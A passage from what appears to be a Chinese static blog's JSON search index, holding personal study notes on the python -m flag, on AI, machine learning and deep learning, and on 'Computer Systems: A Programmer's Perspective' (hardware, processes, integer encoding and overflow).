import cv2，回车确认，若没有报错，表示安装成功","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"python -m 参数释义","slug":"python -m 参数释义","date":"2019-01-02T03:16:34.000Z","updated":"2024-09-21T23:18:02.349Z","comments":true,"path":"2019/01/02/python -m 参数释义/","permalink":"http://example.com/2019/01/02/python%20-m%20%E5%8F%82%E6%95%B0%E9%87%8A%E4%B9%89/","excerpt":"","text":"官方文档-m: run library module as a script（将模块当作脚本运行） 解释在 python 中，所谓的模块，其实也是一个由代码组成的普通脚本文件。这些文件通常会提供一些有用的东西，例如函数或者类，然后我们通过 import 导入使用，而且当我们引入模块的时候，不会产生副作用。但实际上如果我们在 shell 中直接运行这个脚本文件，很有可能会看到有副作用产生。在文件内部，我们一般通过下面的代码来区分当前脚本，是作为模块导入，还是作为脚本直接运行。 12if __name__ == &#x27;__main__&#x27;: print(&#x27;模块直接运行&#x27;); 当文件作为脚本直接运行时，这段代码会产生副作用，输出字符串“模块直接运行”；当文件作为模块被导入时，不会产生副作用，不输出字符串“模块直接运行”； 回到正题，当我们知道一个模块的名字，但不知道它的路径时，我们可以通过 -m 参数，在 shell 中将该模块当作脚本运行，例如： 1python -m module_name 事实上，如果我们知道模块的完整路径（此处假设为”&#x2F;path&#x2F;to&#x2F;module.py”），上述命令的效果，以下面的命令等同 1python /path/to/module.py","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"人工智能、机器学习、深度学习的区别","slug":"人工智能、机器学习、深度学习的区别","date":"2018-12-22T07:29:01.000Z","updated":"2024-09-21T23:11:55.118Z","comments":true,"path":"2018/12/22/人工智能、机器学习、深度学习的区别/","permalink":"http://example.com/2018/12/22/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%81%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"人工智能将通常由人类完成的智能任务，尽量实现自动化； 机器学习与程序设计的区别在传统的程序设计中，我们告知计算机数据和计算规则，计算机输出计算结果；对于机器学习，我们告知计算机数据和计算结果，计算机输出计算规则；因此，机器学习应用，是通过数据训练出来的，而不是通过程序编写出来的； 机器学习与深度学习的区别对于机器学习，它需要将输入的数据，转换 成有意义的表示，然后从有意义的表示中，获取我们想要的结果；对于以前传统的机器学习方法，这种 转换 只涉及 1 ~ 2 层，对于深度学习，这种转换可能涉及几十上百甚至上万层，所以叫做”深度学习“ 机器学习的三要素 样本数据集 预期输出的示例 衡量结果好坏的方法 机器学习的核心在预先定义的一组方法（即假设空间 hypothesis space ）中，找到一种有意义的变换数据的方法，使得数据转换成更加有用的表示（representation） 深度学习中“深度”的意思 深度（depth） 是指学习的过程，涉及很多层级的堆叠，所以深度学习也叫层级表示学习（hierarchical representation learning） ，或叫分层表示学习（layer representation learning）； 分层的做法，来源于神经网络模型（neural network）启发，但事实上它跟人类大脑的神经网络模型，并没有任何关系；只是恰好用这个启发，来命名这个学习模型而已； 传统的机器学习由于只涉及 1~2 层的数据表示，因此有时也叫做浅层学习（shallow learning）； 深度学习可以简单理解为：一种学习数据表示的多级方法；每一级的方法，就像是一个蒸馏的操作，虽然每经过一级变换，数据变得越来越少，但纯度却越来越高，从而跟要解决的任务越来越相关； 深度学习的工作原理 权重（weight） ：神经网络中，某一层对数据所做的变换操作，存储于该层的权重中；权重是一组数字，它是该层数据变换操作的参数（parameter） ；每层的数据变换操作，通过权重来实现操作的参数化（parameterize） ； 学习的过程，即为神经网络中的所有层，找到一组最合适的权重值，使得输入的示例，能够与目标一一对应； 损失函数（loss function） ：用于计算神经网络的预测值与真实目标值之间的差距（损失值）；损失函数有时也叫目标函数（objective function） 深度学习技巧：根据损失函数计算出的差距（损失值），作为反馈信号，对权重进行微调，以降低下一次计算的损失值；这种调节由优化器（optimizer）来完成，它使用了反向传播算法（back propagation）的原理； 整个调节的过程，称为训练循环；通过对几千个示例，进行几十次的循环，最后就有可能得到损失值最小的计算模型；","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://example.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]},{"title":"深入理解计算机系统","slug":"深入理解计算机系统","date":"2018-12-08T03:53:00.000Z","updated":"2024-09-22T23:08:41.997Z","comments":true,"path":"2018/12/08/深入理解计算机系统/","permalink":"http://example.com/2018/12/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"计算机系统漫游 信息就是位+上下文 使用 ASCII 字符构成的文件称为文本文件，其他所有文件称为二进制文件； ASCII 字符使用一个单字节的整数，来代表每个字符； 计算中的所有信息，都是用一串字节（即byte, 比特）来表示的；在不同的上下文中，同样一串字节会被翻译成不同的信息；因此，需要保证上下文正确，才能获取正确的信息；（有些值用4字节表示，有些用8字节表示；当提取的时候，需要提取多长的一段范围，则写在了另外一个位置的某些字节中，所以，事实上，所谓的类型在底层是不存在的，它会被转换成对一定长度的位操作，不同的类型，需要操作的位长度不相同）； 计算机对数据的模拟，由于位数的限制，只能是有限接近于真实值； 程序编译指将程序翻译成不同的格式，编译过程如下： 预处理器：将源文件（即源程序，格式为文本文件）hello.c 进行预处理修改（例如插入引用的文件的内容），得到 hello.i 编译器：将 hello.i 编译成汇编程序 hello.s； 汇编器：将汇编程序 hello.s 翻译成机器指令 hello.o 链接器：将 hello.o 依赖的其他文件链接起来，最后得到 hello 程序（可执行目标文件）（由于操作系统使用进程对硬件进行了抽象，让程序感觉好像自己是独占内存一样，所以程序本身可以不用关心是否会与其他程序发生内存使用的冲突） 疑问：如果在预处理阶段已经插入了其他文件，为什么此处还需要链接其他文件？ 答：因为有可能插入的只是一个声明文件 xxx.h，而不包含实现文件 xxx.c，所以需要链接；如果插入的是 xxx.c 文件，则不需要链接； 了解编译系统工作原理的好处 优化程序性能； 理解链接时发生的错误； 避免安全漏洞； shell 是一个命令行解释器 它等待用户输入命令，然后执行它，如果输入的命令不是内置的命令，则它会把输入当作一个可执行文件的名称，尝试加载并执行该可执行文件，然后等待可执行文件运行终止； 终止后，等待用户输入下一个命令； 系统的硬件组成 总线：总线通过连接各个不同的硬件零部件，实现它们之间的信息传递；每次传递固定长度的字节，早期是4个字节 （32位），现在是8个字节（64位）（好奇这些固定长度的字节的格式，是否有什么统一的规律？答：没有规律；如何解读由各个硬件自己控制） I&#x2F;O 设备：系统通过 I&#x2F;O 设备实现与外界的连接，每个 I&#x2F;O 设备，通过控制器或适配器连接到总线上；控制器与适配器的区别，主要在于封装方式不同： 控制器：封装在主板（主印刷电路板）上的芯片组，或者封装内置在 I&#x2F;O 设备中； 适配器：一般是插在主板上的卡（估计也可以焊在上面）； 操作系统将 I&#x2F;O 设备抽象为文件给应用程序调用，而所谓的驱动程序是一个函数，当应用程序向代表 I&#x2F;O 设备的文件描述符写入数据时，内核会调用相应的驱动程序函数，传递数据给该函数进行处理，从而实现跟硬件设备的通信； 主存：一个临时存储设备，在运行程序过程中，用来存储程序以及程序使用的数据； 物理上：主存是由一组 DRAM 组成的； DRAM：动态随机访问存储器，Dynamic Random Access Memory，里面有电容 电容：存储电荷的容器；电容按存储的电荷多少，分别表示 0 或 1 问：什么是电感？答：电感全称是电磁感应，它用于表示电场的变化引起磁场变化的现象； 电荷：带电粒子；带正电的叫正电荷，带负电的叫负电荷； 逻辑上：主存就像是一个字节数组 通过数组索引可以读取数组内存储的数据；此处的索引即主存的地址；（为主存建立索引的工作是由来完成的呢，操作系统？答：确切的说，应该是内存的驱动程序在翻译索引，将其关联到对应的位置） 不同的数据类型，占用的字节数量不同；在 linux x86-64 的机器上，short 占用2字节，int，char 占用 4 字节，long, double 占用 8 字节；在有些机器上，char 只占用一个字节； 处理器 中央处理器 CPU 由三部分组成，分别是：控制单元、存储单元（寄存器）、算术逻辑单元（ALU）； 寄存器 数据寄存器：存储从主存中加载的数据； 指令寄存器：存储从主存中加载的指令；（听上去主存的指令和数据好像是分开的？答：确实是分开存储的） 程序计数器：存储当前正在执行的指令；当指令执行结束后，指向下一条指令； 运行 Hello 程序的过程 常规： shell 接收到用户的指令输入，将指令发给 CPU 事实上 shell 获得用户输入后，还有一个调用相应的内置函数或可执行文件，得到指令，再发给 CPU 的过程； CPU 解读指令，从磁盘读取可执行文件到主存 CPU 从主存加载指令和数据到 CPU 进行计算（这么说来，加载到主存的可执行文件貌似是由指令+数据组成的？答：没错） CPU 将计算结果输出到 I&#x2F;O 设备，如屏幕； 通过使用 DMA （直接存储器存取）技术，第 1 步和第 2 步可以合并成一步，shell 收到指令后，直接从磁盘加载数据到主存，不需要经过 CPU； DMA 原理：相当于在硬件内部，实现一个小型的 CPU，这个 CPU 被允许对内存进行访问和数据传输，这样可以减少 CPU 在传输数据任务上的占用（由各个IO 设备的内置小型 CPU 分担了 CPU 的部分工作量） DMA 问题：由于 DMA 的引入，有可能发生 CPU 的缓存，与主存的数据不一致，因此需要引入冲突解决机制（一般有同调和非同调两种方案） 高速缓存 由于 CPU 寄存器、主存、磁盘三者的访问速度差距很大，寄存器大约比主存快100倍，主存大约比磁盘快1000万倍，而且这种速度的差异还在增大；因此，通过引入高速缓存的技术来减少这种差距； 原理：在寄存器和内存之间，增加高速缓存模块，提前将 CPU 可能会用到的数据放在里面； 缓存模块的访问速度比寄存器慢5倍，但比主存快5-10倍 缓存模块存储的容量大概是寄存器的100倍，从而实现速度和容量之间的一种兼顾平衡； 缓存模块使用 SRAM（静态随机访问存储器） SRAM：静态的意思是通电后，即保存的数据会一直稳定存在，只有断电的情况下才会消失； DRAM：使用电容来代表位信息，而电容存在放电现象，因此需要周期性的通电，避免保存的信息丢失，所以称为动态； 缓存模块可以分多级，如 L1, L2, L3（L0 用来指代寄存器），越前面的速度越快，但容量越小，用来存储更常用的数据； 程序可以考虑利用高速缓存的存在，来提高程序的运行速度； 晶体管：有三个极，可以起到放大信号、开关信号、调节信号的作用； 晶体管貌似对应《编码》里面的继电器？然后由晶体管可以组成逻辑门，通过逻辑门阵列，实现 CPU 的指令集； 后来查询了一下，发现晶体管比继电器更高级一点，它具备开关、放大、稳压等几个功能，而单个继电器只具备开关功能，需要多个继电器组合，才能具备以上功能； 存储设备形成的层次结构：在整个金字塔中，上一层设备，作为下一层设备的高速缓存； 操作系统：管理硬件 在应用程序和处理器&#x2F;主存&#x2F;IO设备之间，增加了一层抽象，这层抽象即操作系统，它实现了应用程序与硬件之间的对接，目的有二： 防止硬件被失控的应用程序滥用； 让应用程序对硬件的访问变得更简单，不需要去了解硬件的实现细节；对于相同的操作系统，即使在不同类型的机器上，访问方式都是一样的； 操作系统通过以下几个抽象概念实现以上两个目地； 文件：对 I&#x2F;O 设备的抽象，即文件 &#x3D; I&#x2F;O 设备； 虚拟内存：对 I&#x2F;O 设备 + 主存的抽象，即虚拟内存 &#x3D; 主存 + 文件；数据只可能存在于两种地方，要么在主存里面，要么在文件里面，网络也是一种文件；（但貌似对文件数据的访问，需要将数据从文件加载到主存中？答：没错） 指令集：对处理器的抽象，即指令集 &#x3D; 处理器 进程：对 I&#x2F;O 设备 + 主存 + 处理器的抽象，即进程 &#x3D; 虚拟内存 + 指令集；（因此，貌似对于应用程序来说，就是在不断做“指令+虚拟内存”的操作，如果应用程序关心的是虚拟内存，那么操作系统就要实现物理内存与虚拟内存的对应？答：没错，CPU 要处理地址翻译的工作）； 虚拟机：即虚拟机 &#x3D; 操作系统 + 进程； 进程 操作系统通过进程制造一层抽象，使得程序能够独占并调用所有硬件资源的假象（这样可以简化程序的编写，让其不用关心具体硬件的实现）； 进程使得并发运行成为可能，即两个程序的指令，是可以交错使用硬件资源的（通过在进程间切换实现）；（对于单核处理器来说，进程并发或许只是一种伪并发？嗯，没错，不过由于 CPU 很快，这种机制才能实现多任务） 操作系统需要保持进程切换所需要的上下文信息；当从一个进程切换到另外一个进程时，由操作系统的内核来管理（貌似主要是要做好虚拟内存与物理内存的对应工作？不仅如此，还需要保存一堆其他信息，包括程序计数器、寄存器值等，这样再切换回来的时候，才能恢复现场，从中断处继续处理下一条指令）； 线程 线程是操作系统内核能够进行运算调度的最小单位；一条线程其实是进程中某一个单一顺序的逻辑控制流； 每个线程都有自己的线程上下文，包括唯一的整数线程ID、栈、栈指针、程序计数器、通用目的寄存器和条件码等； 在现代系统中，一个进程，是可以由多个线程组成的；每个线程执行不同的任务； 这些线程都运行在进程的相同的上下文中，它们共享同样的代码和全局数据 如何提供线程的抽象？C 语言中有相应的库函数（估计其他语言也有） 或许可以理解为，在同一个进程中，线程之间面对的是同一个虚拟内存，所以它们的数据是可以共享的；而如果是进程间的通信，则面对的是不同的虚拟内存，需要操作系统参与才能实现数据的通讯 不同进程之间如何实现通信？有多种方式，包括信号、套接字、内存映射； 由于线程共享数据比进程更快更方便，因此，利用线程机制，也可以提高程序的并发处理能力； 当存在多核处理器时，线程就可以派上用场了 如果只有单核处理器，则多线程也没用 现在想想，感觉可能还是有点用，因为通过引入线程池队列，如果程序是非阻塞的，则线程也可以交替使用单核心，因为虽然只有单核心，但可以引用多个寄存器和计数器，共享单核心的算术逻辑单元； 后来有了超线程技术，也使得多线程变得有用； 但线程也带来一个问题，即一个对象可能已经被某个线程销毁了，而其他线程并不知道； 咖啡店的比喻 顾客到咖啡店购买自己想喝的某种咖啡；咖啡店分为前台和后台，前台负责接单和结账，后台负责制作，它们是两个团队；后台团队进入了工业4.0，已经由以前的人工制作咖啡，升级了流水线全自动超高速咖啡制作机，它的速度很快，远远超过前台小妹的速度； 解决方案之一是可以多招几个前台，由于她们处理不同客户的需求； 虚拟内存 虚拟内存是一种抽象，它为程序提供一种独占内存的假象； 地址从低到高分别是：程序代码和数据、堆、共享库、栈、内核虚拟内存 其中堆和栈是可以动态变大或变小的； 今天才有点明白共享库是什么；大多数程序都会用到一些第三方编写好的库代码；很多这类型的库是通用的，因为每个程序拷贝一份显然在存储效率上并不划算；因此，操作系统提供了一种共享机制，程序可以通过动态链接，使用共享库；好处是可以减少程序本身占用的体积；坏处是当库不存在时，程序不能运行； 还有其他的好处包括可以简化程序的更新； 文件 文件即是字节的系列（即字节数组），所有的 I&#x2F;O 设备，都可以看成是文件；这个概念非常强大，它提供了一种统一的抽象，使得程序对数据访问变得统一和简单，不需要了解不同硬件的具体实现技术； 系统之间利用网络通信 网络也可以当作是一个 I&#x2F;O 设备，系统通过访问这个 I&#x2F;O 设备，实现数据的交换； 重要主题 Amdahl 定律：系统某个部分性能的提高，对整体性能的提高，取决于该部分原来耗时的占比和加速程度 s &#x3D; 1 &#x2F; (( 1 - a ) + a&#x2F;k) &#x3D; Told &#x2F; Tnew 其中：a 指占比，k 指提升比例, s 指加速比 并发和并行 线程级并发：正常情况下一个 CPU 内核只能处理一个线程，但通过引入多个寄存器和计数器，可以模拟出一个 CPU 内核处理两个线程，两个线程共享一个算术逻辑单元 ALU，ALU 在寄存器和计数器之间切换，使得寄存器和计数器在加载的数据的时候，ALU 不会出现空闲等待；线程级的并发，仅是硬件提供支持，同时还需要应用程序面向线程并发进行开发，才能用上硬件的并发功能； 指令级并行：早期 CPU 执行一条指令需要多个时钟周期，现在 CPU 已经支持一个时钟周期执行多个指令（超标量处理器）；实现的原理是通过将指令执行操作进行标准分段，如果有多条指令，都存在相同的操作段，则对这些指令相同的段进行一次性批量操作；（据说这种方式叫流水线设计）（可以相像成财务去银行存钱，老板说要存100元，出纳可以单独跑一次，但如果有其他主管也说要存钱，出纳跑一次可以存多笔钱）（当指令之间存在依赖关系时， CPU 内部需要实现数据转发的机制） 单指令、多数据并行：一条 CPU 指令，产生多个并行的数据操作，例如一条指令同时对 8 对浮点数进行加法操作；这种设计可以用来提高图像、视频、声音等场景的计算速度；（貌似这是显卡 GPU 的工作原理）（CPU 里面也有一个 SSE 或 AVE 指令集来实现这些功能）； 抽象的重要性 CPU 的指令集架构即是对 CPU 操作的一种抽象；它可以让编程变得更简单，不用去关心 CPU 底层的硬件实现细节； 信息的表示和处理 信息存储 综述 为了充分有效的利用内存，对于不同的数据类型（正数、负数、小数）我们采用了不同的编码表示方法，例如无符号编码（正数）、补码编码（负数）、浮点数编码（小数），因此，这也使得对不同类型的数据进行运算时，需要先将它们转换成相同的数据类型之后才能计算，否则会出错；因为不同的编码方式，意味着信息有不同的上下文； 由于信息是以二进制的形式来存储和处理的，以及计算机只能以有限位来模拟数据，这使得一些在数学中成立的规律（例如交换律，结合律等），在有限位的二进制计算中，不一定适用；计算过程中有可能会产生溢出； 大量计算机的安全漏洞，都是因为计算机在做算术运算时的一些细节引起的（事实上，计算机的本质，就是使用二进制进行位运算，所以安全由运算规则引发，也是可以理解的） 内存的最小物理单元是位，但最小可寻址的单元是字节（大多数计算机以8个位为一个字节）； 对于应用程序来，内存就像一个巨大的字节数组；每个字节有一个内存地址，所有字节地址的集合，组成一个虚拟地址空间； 事实上应用程序面对的是一个虚拟内存；由操作系统来管理虚拟内存和物理内存之间的映射； 十六进制表示法 一个字节的值域：二进制是 00000000 - 11111111，十进制是 0 - 255，十六进制是 00 - FF， 在 C 语言中，使用 0x 或 0X 开头来表示十六进制的值； 字数据大小 计算机有一个字长的属性，这个属性决定了其能够处理的最大的虚拟地址空间（因为跟寻址有关系），以前的计算机一个字长的字节数是32位（4个字节），新的计算机则以64位为主（8个字节）；对于32位计算机， 232 位约等于 4 * 109 个字节（即约4GB），即32位计算机的最大内存上限是4GB； 今天终于知道字长原来是跟 CPU 的指令集设计有关，指令就像函数，接收立即数或者地址做为参数，而参数的长度是有限制的，所以也就导致了最大寻址空间的问题； 程序可以编译成32位，也可以编译成64位，对于64位计算机来说，二者都可以运行；但对于32位的计算机来说，则无法运行64位的程序； 寻址和字节顺序 在几乎所有的计算机上面，多字节对象，在内存中都是连续存储的 貌似这样寻址效率应该会比较高一些 好奇对于 C 语言中的可变长度数组，如何初始化空间进行存储？答：刚发现 C 中的可变长度数组并不是真正动态的长度，而只是动态分配，即一开始先不分配空间，等收到长度参数后，再分配空间；一旦分配完成后，长度就是固定的了，不能添加超过长度的数据，不然会越界； 字节存储顺序 小端法：最低的有效字节在前面； 刚发现小端法，不是指单个字节内部的小端，而是多个字节顺序的小端，例如一个整数由4个字节组成，小端法表示的 0x73 ff ff ff，它对应的大端法为 0x ff ff ff 73，注意：在单个字节内部，73仍然是73，而不是37； 大端法：最高的有效字节在前面； 对于单台计算机，使用哪种字节存储顺序对于用户和程序员都无关紧要（除非去阅读机器级代码，或者需要读取每个字节内存储的信息）；但对于网络中的计算机，则可能引发错误；因此，通过在网络协议中引入传输标准，来解决这个问题； 但是，貌似已编译完成的机器代码，无法在不同存储顺序的机器之间移植，需要重新编译？ C 语言使用括号来做为强制类型转换运算符（很好奇之前的书好像没提到），示例：(byte_pointer) &amp;a，表示不管 a 之前是什么类型，现在转换为 byte_pointer 类型； 1. 所谓的强制类型转换，或许也可以理解为对同一段二进制信息，换一种解读方式； 表示字符串 C 语言中，字符串表示为一个以 null 结束的字符数组；因此，这也使得字符串的长度，会增加1，即那个不可见的 null 占据一个长度单位； 在字符串的设计上，C 语言的设计很糟糕，当非法字符串没有 null 结束符时，字符串的读取动作无法停止，导致会产生未定义行为； 当代码被编译器翻译成机器代码时，所有类型的信息将丢失，转换成相应的位操作（指令+数据），因此，二进制程序一般很难在不同的操作系统和机器上进行移植；32位和64位完全不同，windows 和 linux 也会不同； 但是相同操作系统相同位处理器的情况下，则可以移植； 布尔代数简介 共有四种，分别是与运算，或运算，取反运算，异或运算（当 a 为 0, b 为 1 或者 a 为 1, b 为 0 时，才取真，否则取假） C 语言中的位级运算 C 语言支持按位布尔运算，运算符包括 &amp;, |, ^, ~, &lt;&lt;, &gt;&gt;； a^(a^b) &#x3D; b； 掩码运算：通过对目标位的按位操作，达到屏蔽指定位而实现需求； 按位与：用来实现保留指定位的值，其他位的值置为 0 的需求； 与 1 的与运算，会保留原来的值； 与 0 的与运算，会将原来的值置 0； 按位或：可实现把部分位置为 1，同时保留某些位；即原为 1 的位保持不变，原为 0 的位变成 1； 与 1 的或运算，会将位的值置为1； 与 1 的与运算，会保留位的原值； 按位异或：可实现把部分位反转，同时保留某些位； 与 1 的异或运算，会将原来的值取反；即原为 1 的位会变成 0，原为 0 的位会变成 1；（这么说，异或可以用来做取反运算，效果同取反运算） 与 0 的异或运算，会保留原来的值；即原为 0 的位仍为 0，原为 1 的位仍为 1；（感觉这里的效果同 1 的与运算） 通过指定位数的掩码，例如 111000，则前三位取反，后三位保留； 按位取反：对参与计算的二进制取反（注：这是一个一元运算符）（可以用 1 做异或运算）； 左移运算：将二进制位左移，高位丢弃，低位补0；如果数值比较小，丢弃的高位只有0没有1，则左移相当于乘以 2 的 n 次方； 右移运算：将二进制位右移，低位丢弃，高位补0或1，如果最高位是0则补0，如果是1则补1； 如果左端全部补 0，称为逻辑右移； 如果左端补原最高位的有效值，称为算术右移（据说算术右移对有符号的整数运算有很大的用处，待了解有什么用？莫非用于除法？） 由于 C 语言没有明确规定，当进行右移运算时，使用哪种右移方法，导致存在歧义的可能性；不过据说所有的编译器，对有符号数，都统一使用算术右移的方式；而对于无符号数，则使用逻辑右移的方式； 取反运算：0变1，1变0；两次取反运算，会得到原来的数值； 原码：首位为符号位，0表示正，1表示负，余下位为绝对值的二进制位； 由于首位用来存放符号，原来1个字节8位能表示的范围就改变了，原是 0255，现在变成 -128127 了； 补码：正数与原码相同；负数的符号位不变（即首位为1），余下位为绝对值的二进制位取反，然后加1；示例如下： 正 100 的原码和补码都为 01100100; 负 100 的原码为 11100100； 负 100 的补码为 10011011 + 1 &#x3D; 10011100； 几乎所有的计算机，都使用补码来实现有符号的整数；在补码中，整数被分为两个子范围，一段是负整数（最左位以1开头），一段是非负整数（最左位以0开头）；计算机从内存读取二进制位，需要进行整数的还原操作，如果最左位是0，则原封不动的取出；如果最左位是1，则取出后，做一次取补运算（有两种计算方法，简便的方法是最左位不变，其他位取反后加1）（原理：一个值做两次取补运算后，会得到原来的值）；问：为什么取出来后，需要进行取补运算的还原操作呢？貌似可以不用的嘛，直接参与计算不就好了？ 相对于原码表示法，补码表示法中，只有一种 0，原码表示法则有正 0 和负 0 两种 0； 取补运算（假设原来的数是正数） 方法1：从最右开始复制位，直到有1被复制，然后余下的位做取反运算； 示例：00110100 取补后 为 11001100 方法2：先进行取反运算，然后加1； 示例 00110100 取反得到 11001011，加 1 后得到 11001100 补码的优点：对于两个非负整数相加，直接按位相加；对于两个非负整数想减，例如 a - b，则转换为 a + (-b)，即取 b 的补码然后相加（总结：不管正负，只需考虑加法；对于减法，对减数取补后，变成做加法运算） 当使用补码与另外一个数直接相加时，由于补码的高位经常是 ff，所以加法的过程中，一旦进1，将使得补码前面的高位 ff 全部变成0，使得进1无效，从而实现了减法的效果； 整数表示 整型数据类型 貌似计算机的二进制运算中，只有加法、乘法和取反，没有减法（原因：为了简便，将减法当成正数和负数的加法来操作） 乘法和除法其实是通过移位来实现； 有符号整数的范围，比无符号整数的范围多1；比如 signed char 取值范围为 -128~127 合计 256 个数，unsigned char 取值范围为 0 ~255，合计 255 个数；原因：0 是非负数，因此正数部分扣去零后，就少了一个； C 标准要求取值范围对称； 由于不同机器的整数范围不同，因此在编码的时候，就需要考虑程序在不同机器上面的可移植性，尤其是在使用互联网进行数据传输时；为了解决这个问题，C99 标准引入了 &lt;stdint.h&gt; 头文件，并在文件中规定了各种类型名称的宏；这样，当使用这个宏名称对变量进行定义时，编译器根据不同的机器，就能够转化成正确的数据长度，确保了可移植性；这一点上，Java 就做得比较好，它明确规定了不同整数类型的取值范围和补码表示方式，确保了可移植性； 事实上 Java 是通过虚拟机来实现的可移植性，跟类型貌似无关； 强制类型转换并没有改变位的值，而是改变了解释这些位的方式；（因此强制类型转换存在出错的可能性） 一些原理 无符号整数的编码是唯一的，B2U 函数是双射的； 补码编码是唯一的，函数 B2T 是双射的； 补码转化为无符号数，函数 T2U 当 x &gt;&#x3D; 0 时，T2Uw(x) &#x3D; x; 当 x &lt; 0 时，T2Uw(x) &#x3D; x + 2w，例如4位补码 -3 转为无符号数时，等于 -3 + 24 &#x3D; 13； 补码与无符号数的转换效果，其实它们之间有一段重合，然后不管是哪个方向的转换，在于将不重合的那段，移动到另外一头（数学运算即是加上 2w 或减去 2w ）； 在 C 语言中，默认数字都是有符号的，如果要创建无符号数，需要专门用后缀 u 进行标记； C 允许在有符号和无符号之间进行转换，默认的原则是底层位保持不变，改变的是解释方式，即上下文；（重合的部分没有损失，不重合的部分会出错） 当将一种类型的表达式赋值给另外一种类型的变量时，会隐式发生转换的动作； 但隐式转换存在出错的可能性； 当表达式中既包含有符号数，也包含无符号数，会触发 C 的隐式转换，它会将有符号转成无符号，并假设它们都是非负的，然后进行计算；对于算术运算来说，这种隐式转换不会带来差异，但对于关系运算来说，有可能会出现错误的结果； 数字的位扩展，使用场合：当某个数据类型的位数太少，不够使用时，可以将其位数进行扩展； 零扩展：在最高位加 0，常用于无符号数； 符号扩展：添加最高位的有效值，常用于补码数的扩展； 由于负数才需要取补运算，因此新增的 1 在取补后为 0，因此最高位有效扩展不会改变原来的值？真的吗？真的； 有疑问，负数本身即是用补码表示的，当它进行符号扩展时，会发生什么？刚测试了一下，貌似不会改变原来的值；因为是用1来扩展高位； 当进行数据类型转换时，例如 short -&gt; unsigned，由于 short 只有2字节，而 unsigned 有 4 字节，转换过程实际分成了 2 步进行，第一步先将 short 变成 int，得到 4 字节的长度，之后再将 int 转换成 unsigned；这里面藏着一个顺序问题，如果顺序是先转换成 unsigned short 再转换成 unsigned int，则得到的结果会有所不同；前者的转换顺序是 C 语言标准要求的规则； 一个十六进制数用4个位表示，从 8 开始到 F，其第 1 位都是 1；因此，在做算术右移运算时，左侧补 1 会有不同的结果 例如：0x81 右移24位会得到 0xFFFFFF81；而 0x71 右移 24 位会得到 0x00000071； 对数字进行扩展，不会改变原来的值，但如果是对数字进行截断，则很有可能会改变原来的值； 对无符号数进行截断，得到的结果即是截断后剩下的位数的结果； 对有符号数（补码）进行截断，其结果分成两步得到，第一步先做无符号截断，然后再使用 U2T 做无符号转补码；，即 U2T(B2U( x mod 2k)) 无符号数 0 与有符号数 1 相减，即 unsigned 0 - 1，会触发隐式类型转换，首先减去 1 被视为负 -1，得到负1 的补码，然后转成无符号，再与无符号 0 相加，最终会得到一个无符号的 UMax； 两个无符号数相减，结果永远大于等于0；因为无符号数的负数的补码，由于仍然是无符号数，所以也是正的； 无符号数是某些场合是非常有用的（位的布尔标记，实现模运算和多精度运算等），但由于隐式类型转换的存在，会为错误的发生埋下隐患，得到好处的同时，也要付出代价；除了 C 语言外，绝大多数语言并不支持无符号数；（貌似C++也是支持的） 整数运算 无符号加法 由于绝大多数编程语言使用有限精度的运算（LISP 支持无限精度），使得运算结果超出精度限制时，会产生溢出，溢出的判断标准，加法：如果计算结果小于原始值，则发生了溢出；最后的计算结果为和减去 2w 后的结果；C 语言不会对计算溢出发出警告； 模数加法：对两个数相加后进行求模运算，例如 9 + 9 后对 10 求模得到 8；有一个单位元 0，每个元素有一个加法逆元； 阿贝尔群：又称为可交换群，满足运算不依赖于其顺序的群，其推广了整数集合的加法运算；其基本研究对象是模和向量空间； 代数结构：在一种或多种运算下，封闭的一个或多个集合，例如群，环，域，模，向量空间，格，域代数等；抽象代数即是对代数结构的研究； 加法逆元：对于任意的元素 n，存在另外一个元素 -n，使得其与 n 的相加结果为 0； 在 C 语言中，由于没有布尔类型，因此返回 True 实际上是返回整数 1，返回 False 实际上是返回整数 0； 示例：unsigned sum &#x3D; x + y; return sum &gt;&#x3D; x; 补码加法 补码表示法由于有符号的存在，当正、负溢出时，结果就会滚到符号的另外一边去了； 补码加法与无符号加法的位数表示是相同的，因此补码加法可以通过先将补码转成无符号，相加得到结果后，再转回补码的方式进行； 溢出判断：如果 x, y 都大于0，和却小于0，则发生正溢出；如果x, y 都小于0，和却大于0，则发生负溢出； int sum &#x3D; x + y; int neg_over &#x3D; x &gt; 0 &amp;&amp; y &gt; 0 &amp;&amp; sum &lt; 0; int pos_over &#x3D; x &lt; 0 &amp;&amp; y &lt; 0 &amp;&amp; sum &gt; 0; return !neg_over &amp;&amp; !pos_over; 补法的非：补码的非，除了 Tmin 是它自身外，其他数的非都是它的加法逆元； 无符号乘法：将一个无符号数截断为 w 位，相当于对这个无符号数求 2w 模； 补码乘法 同无符号乘法，区别在于最后需要将结果转成补码表示； 补码乘法和无符号乘法具有位级等价性（其实结果是不同的，但由于存在模 2w 截断，导致最后结果相同） 乘以常数 如果是乘以 2 的幂，则 x * 2k 可以表示为 将 x 的位模式在右侧增加 k 个 0； 无符号数和补码数，与 2 的 k 次幂的乘法，不管是否是否溢出，都等于原数左移 k 位； 当乘以常数时，例如乘以 14，可以将 14 拆解为多个 2 的幂的加法来完成，例如 23 + 22 + 21，这样就可以将乘法变成加法来提高计算速度；14 的位模式为 1110，两种计算方式为 ( x &lt;&lt; n) + (x &lt;&lt; n -1 ) + …… + (x &lt;&lt; m) (x &lt;&lt; (n + 1)) - (x &lt;&lt; m) 除以2的幂 除以 2 